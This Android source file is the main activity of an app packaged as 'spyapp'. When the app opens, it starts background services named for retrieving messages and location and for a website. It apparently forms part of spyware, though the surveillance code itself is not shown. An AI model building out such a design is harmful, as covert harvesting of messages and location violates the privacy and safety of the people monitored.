package com.example.spyapp;

import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.view.Menu;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		Intent intent2 = new Intent(this,MessageRetreiverService.class);
		startService(intent2);
		Intent intent3 = new Intent(this,LocationRetreiverService.class);
		startService(intent3);
		Intent intent4 = new Intent(this,WebsiteService.class);
		startService(intent4);
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
